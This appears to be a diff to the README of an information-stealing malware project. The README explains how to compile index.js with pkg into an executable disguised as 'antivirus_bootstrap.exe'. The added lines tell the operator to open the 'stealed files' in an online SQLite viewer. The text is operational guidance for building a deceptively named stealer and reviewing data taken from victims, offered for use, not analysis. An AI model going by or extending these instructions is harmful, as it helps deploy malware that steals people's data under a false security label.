@@ -8,5 +8,8 @@ How to compile/build index.js?
 For automatic OS Type compiling:
 pkg index.js -o antivirus_bootstrap.exe
 
+How do I read the stealed files thingy?
+View/Read them using https://inloop.github.io/sqlite-viewer/
+
 PKG Help menu:
 pkg --help
